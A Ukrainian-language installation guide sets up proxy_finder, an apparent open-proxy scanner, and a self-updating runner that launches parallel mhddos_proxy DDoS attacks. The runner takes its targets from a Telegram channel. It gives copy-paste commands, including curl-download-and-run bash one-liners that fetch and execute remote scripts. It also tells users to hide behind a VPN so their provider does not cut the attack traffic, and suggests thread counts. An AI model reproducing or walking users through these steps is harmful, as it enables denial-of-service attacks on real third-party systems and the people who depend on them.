# Інструкції встановлення proxy_finder на Windows

Тестував лише на Windows 10  
  
**!!!УСІ ПУНКТИ ОБОВ'ЯЗКОВІ!!!**

❗️Треба встановити супер-швидкий та стабільний VPN, щоб ваш провайдер не різав трафік через підключення до багатьох ІР(проксі):
https://auto-ddos.notion.site/VPN-effde85923534cf7b4caa198a0ef0d23

Якщо ви будете без ВПН, то у вас взагалі може попасти інтернет на роутері, як було у мене, бо провайдери не полюбляють коли з їх ІР йде трафік на велику кількість інших ІР(проксі)

Інші ВПН теж можуть не підійти, бо вони можуть відключатися 

1. [**Встановлення Python3**](#1-%D0%B2%D1%81%D1%82%D0%B0%D0%BD%D0%BE%D0%B2%D0%BB%D0%B5%D0%BD%D0%BD%D1%8F-python3)  
2. [**Встановлення Git**](#2-%D0%B2%D1%81%D1%82%D0%B0%D0%BD%D0%BE%D0%B2%D0%BB%D0%B5%D0%BD%D0%BD%D1%8F-git)  
3. [**Запуск пошуку**](#3-%D0%B7%D0%B0%D0%BF%D1%83%D1%81%D0%BA-%D0%BF%D0%BE%D1%88%D1%83%D0%BA%D1%83)  
3.1 [**Запуск напряму через Термінал**](#31-%D0%B7%D0%B0%D0%BF%D1%83%D1%81%D0%BA-%D0%BD%D0%B0%D0%BF%D1%80%D1%8F%D0%BC%D1%83-%D1%87%D0%B5%D1%80%D0%B5%D0%B7-%D1%82%D0%B5%D1%80%D0%BC%D1%96%D0%BD%D0%B0%D0%BB)  
3.2 [**Запуск за допомогою авто-оновлюваного bash-скрипта, який сам завантажить усі необхідні файли, та самостійно буде завантажувати оновлення**](#32-%D0%B7%D0%B0%D0%BF%D1%83%D1%81%D0%BA-%D0%B7%D0%B0-%D0%B4%D0%BE%D0%BF%D0%BE%D0%BC%D0%BE%D0%B3%D0%BE%D1%8E-%D0%B0%D0%B2%D1%82%D0%BE-%D0%BE%D0%BD%D0%BE%D0%B2%D0%BB%D1%8E%D0%B2%D0%B0%D0%BD%D0%BE%D0%B3%D0%BE-bash-%D1%81%D0%BA%D1%80%D0%B8%D0%BF%D1%82%D0%B0-%D1%8F%D0%BA%D0%B8%D0%B9-%D1%81%D0%B0%D0%BC-%D0%B7%D0%B0%D0%B2%D0%B0%D0%BD%D1%82%D0%B0%D0%B6%D0%B8%D1%82%D1%8C-%D1%83%D1%81%D1%96-%D0%BD%D0%B5%D0%BE%D0%B1%D1%85%D1%96%D0%B4%D0%BD%D1%96-%D1%84%D0%B0%D0%B9%D0%BB%D0%B8-%D1%82%D0%B0-%D1%81%D0%B0%D0%BC%D0%BE%D1%81%D1%82%D1%96%D0%B9%D0%BD%D0%BE-%D0%B1%D1%83%D0%B4%D0%B5-%D0%B7%D0%B0%D0%B2%D0%B0%D0%BD%D1%82%D0%B0%D0%B6%D1%83%D0%B2%D0%B0%D1%82%D0%B8-%D0%BE%D0%BD%D0%BE%D0%B2%D0%BB%D0%B5%D0%BD%D0%BD%D1%8F)  
3.3 [**Найкращий спосіб все-в-одному - авто-оновлювані mhddos_proxy та proxy_finder в одному скрипті**](#33-%D0%BD%D0%B0%D0%B9%D0%BA%D1%80%D0%B0%D1%89%D0%B8%D0%B9-%D1%81%D0%BF%D0%BE%D1%81%D1%96%D0%B1-%D0%B2%D1%81%D0%B5-%D0%B2-%D0%BE%D0%B4%D0%BD%D0%BE%D0%BC%D1%83---%D0%B0%D0%B2%D1%82%D0%BE-%D0%BE%D0%BD%D0%BE%D0%B2%D0%BB%D1%8E%D0%B2%D0%B0%D0%BD%D1%96-mhddos_proxy-%D1%82%D0%B0-proxy_finder-%D0%B2-%D0%BE%D0%B4%D0%BD%D0%BE%D0%BC%D1%83-%D1%81%D0%BA%D1%80%D0%B8%D0%BF%D1%82%D1%96)  

Якщо виникли будь-які проблеми на будь-якому етапі пишіть в телеграм: @brainqdead  

## 1. Встановлення Python3
Спосіб 1:  
Заходимо в cmd (Командная строка)
![image](https://user-images.githubusercontent.com/74729549/167741362-be1ec067-bd71-45b3-9264-5baeba0e844b.png)  

-> Прописуємо python3
![image](https://user-images.githubusercontent.com/74729549/167741398-9439e1b7-bffe-4964-bb70-91a5b4b83ba5.png)  


 -> натискаємо Enter  
Якщо у вас досі немає python3, то Вас перекине до Microsoft store, там натискаєте Отримати / Получить / Get  

Якщо він у вас вже є / ви успішно його отримали то буде ось так: 
![image](https://user-images.githubusercontent.com/74729549/167741390-8f4ef0b7-f958-4ed1-be40-5877a2f0865d.png)  

Після отримання python3 закриваєме це вікно терміналу (командої строки)  

***Якщо через cmd (Командую строку) не вийшло, або у вас Python нижче 3.10 (перевірити можна так `python --version`) - пробуйте зайти самостійно у Microsoft Store та знайти і встановити там Python3.10***  

!!!ТІЛЬКИ ЯКЩО З ПОПЕРЕДНІМ СПОСОБОМ НЕ ВИЙШЛО:!!!
Спосіб 2(може успішно скачатися, але потім не запуститься атака):  
скачуємо python: https://www.python.org  
![image](https://user-images.githubusercontent.com/74729549/167923835-34d51062-369a-4beb-bdb1-88b3581091d7.png)  
Запускаєте скачаний файл(Саме у такому порядку 1-ИЙ ПУНКТ НАЙВАЖЛИВІШИЙ)  
![image](https://user-images.githubusercontent.com/74729549/167923871-1d6b2387-d248-47c5-ad38-c688e952f986.png)  
Далі усе за замовчуванням скрізь клікаєте Далее / Да  

## 2. Встановлення Git

Для початку потрібно ще встановити Notepad++ (зручний редактор коду, він вам згодиться і після нашої перемоги у війні): https://notepad-plus-plus.org/downloads/v8.2.1/    

Коли скачали, запустили установщик та встановили Notepad++ переходимо до наступних пунктів  


Скачуємо установщик git https://gitforwindows.org (ця сама силка на оф. сайті github: https://github.com/git-guides/install-git#install-git-on-windows)  
![image](https://user-images.githubusercontent.com/74729549/167741764-3660a1e0-a79b-4460-aae9-28309ce97c9b.png)
Чекаємо поки скачається, потім запускаємо скачаний файл  

**ВСТАНОВЛЮВАТИ ТРЕБА САМЕ ТАК:**  
![image](https://user-images.githubusercontent.com/74729549/167741828-a3e1c5aa-a3fb-4d95-8705-778a99bda68b.png)  
*Зі списку обрати саме Notepad++ (який ви мали скачати раніше, якщо ні, то закривайте та скачуйте, потім відкривайте Setup файл ще раз)*  
![image](https://user-images.githubusercontent.com/74729549/167741841-b6ceb31a-ded8-41b2-be9c-cab1846791d9.png)  
![image](https://user-images.githubusercontent.com/74729549/167741883-62ecddc4-fffd-405d-a682-a06d6f1edac5.png)  
![image](https://user-images.githubusercontent.com/74729549/167741889-d160c8d2-420a-47bf-987a-9235595ee5b5.png)  
![image](https://user-images.githubusercontent.com/74729549/167741908-cc985a8d-d466-4154-9734-2c9ed1ed50fe.png)  
![image](https://user-images.githubusercontent.com/74729549/167741917-fbc39aed-f3d4-4353-9cea-2fcee1661d8a.png)  
![image](https://user-images.githubusercontent.com/74729549/167741931-ad1cf34c-e49c-41d8-8eb3-8d4119339860.png)  
**Наступний пункт дуже важливий**  
![image](https://user-images.githubusercontent.com/74729549/167741966-7c035bac-9276-42db-ac09-a2957d402f69.png)  
![image](https://user-images.githubusercontent.com/74729549/167741976-48a7e397-f977-42ec-9292-29801708c865.png)  
![image](https://user-images.githubusercontent.com/74729549/167741988-eef8bbf5-6b6c-42cb-971e-4c5b124658cb.png)  
![image](https://user-images.githubusercontent.com/74729549/167741994-93162b55-1931-40e3-82f6-e4a0c768cd9d.png)  
![image](https://user-images.githubusercontent.com/74729549/167742004-c0eaab28-9d27-4f31-9325-9c7d76b2c014.png)  
![image](https://user-images.githubusercontent.com/74729549/167742017-25f7d530-593f-41bf-a226-e5948151a9a1.png)  
Встановлення завершено - натискаємо Finish  

## 3. Запуск пошуку
Надалі після успішного встановлення Python3 та Git потрібно буде кожен день виконувати лише один з наступних пунктів:  
### 3.1 Запуск напряму через Термінал
#### 3.1.1 Встановлення самої програми через Термінал(робимо лише один раз):
Відкриваємо Мой компьютер / Этот компьютер:  
![image](https://user-images.githubusercontent.com/74729549/167746227-6192c1d6-f895-4b01-98fc-98ddf9378fdb.png)  
Шукаємо папку робочого столу:  
![image](https://user-images.githubusercontent.com/74729549/167746244-f3b98d9d-bf07-46a3-8d31-77b9bb400301.png)  
Заходимо у папку Робочого столу:  
![image](https://user-images.githubusercontent.com/74729549/167746271-fbd5b687-1a03-4b21-a016-4593f4fdba56.png)
Та у виділеній області прописуємо три літери `cmd`:  
![image](https://user-images.githubusercontent.com/74729549/167746307-ec4a0331-2536-4015-ba44-bd52e420c7ab.png)  
Та натискаємо Enter - відкриється вікно Терміналу:  
![image](https://user-images.githubusercontent.com/74729549/167746342-a45fb92d-d051-4029-b1f9-61d785f40874.png)
Далі прописуємо наступні команди(та натискаємо Enter), щоб скачати програму та зайти в її папку:  
```shell
git clone https://github.com/porthole-ascend-cinnamon/proxy_finder
cd proxy_finder
```
*можливе таке повідомлення: `fatal: destination path 'proxy_finder' already exists and is not an empty directory.` - це означає, що потрібна папка вже існує - просто йдіть далі по інструкції до пункту 3.1.2 Запуск пошуку проксі*

Повинно вийти ось так:  
![image](https://user-images.githubusercontent.com/74729549/167746721-eb3d9ea7-d7cb-4b7d-a6a4-ed2e125c9411.png)  
#### 3.1.2 Запуск пошуку проксі через Термінал(робимо кожен раз при рестарті машини / пошуку):
Вже у відкритому вікні з минилого пункту вводимо наступні команди:  
щоб мати завжди останню версію:  
```shell
git pull origin main
```
щоб мати завжди останні залежності(без яких пошук не запуститься):  
```shell
python -m pip install -r requirements.txt
```
Має вийти приблизно ось так(у вас може бути трохи інакше, бо завантажаться нові файли / залежності):   
![image](https://user-images.githubusercontent.com/74729549/167747452-0ec0642e-c672-4d2e-b264-330d87969e82.png)
Тепер можемо запускати пошук проксі (але бажано з під [VPN](https://auto-ddos.notion.site/VPN-effde85923534cf7b4caa198a0ef0d23)): 
```shell
python finder.py
```
Вітаю, пошук успішно почався:  
![image](https://user-images.githubusercontent.com/74729549/167747693-c4e731fe-cff9-4c0e-87ac-914a8f34910a.png)  

Також ви можете змінювати кількість потоків (замість 5000, що обираються за замовчуванням), але я б не рекомендував це робити(тим паче якщо у вас паралельно запущенно DDoS, бо можуть початися лаги (буде все тормозити), змінювати ось так:  
```shell
python finder.py --threads 10000
```
де 10000 можна замінити на будь-яке значення від 1 до 15000, але **ми рекомендуємо саме 5000, які стоять за замовчуванням**  

### 3.2 Запуск за допомогою авто-оновлюваного bash-скрипта, який сам завантажить усі необхідні файли, та самостійно буде завантажувати оновлення
Вікриваємо скачаний раніше(у пункті 2) Git Bash:  
![image](https://user-images.githubusercontent.com/74729549/167748665-d102dc65-08a3-4262-897f-a1c70ed729bc.png)  
або шукайте його на Робочому столі  
та вводимо наступне:
```shell
curl -LO https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_finder/main/auto_runner_windows.sh && bash auto_runner_windows.sh 5000
```
де 5000 можна замінити на будь-яке значення від 1 до 15000, але **ми рекомендуємо саме 5000, які стоять за замовчуванням**  

### 3.3 Найкращий спосіб все-в-одному - авто-оновлювані mhddos_proxy та proxy_finder в одному скрипті
```shell
curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh 1 1500 1000
```
Більш детально про всі параметри можна почитати тут: https://github.com/alexnest-ua/runner_for_windows - цей скрипт дозволяє запустити декілька паралельних DDoS-атак через вбудований mhddos_proxy та має вже вбудований proxy_finder, який ще й автоматично оновлює не лише себе, а й mhddos_proxy та proxy_finder, та бере актуальні цілі звідси: https://t.me/ddos_separ  
Тому можете тут https://github.com/alexnest-ua/runner_for_windows обирати параметри під свій ПК - запускати атаку та йти займатися своїми справами, а скрипт зробить все за вас 
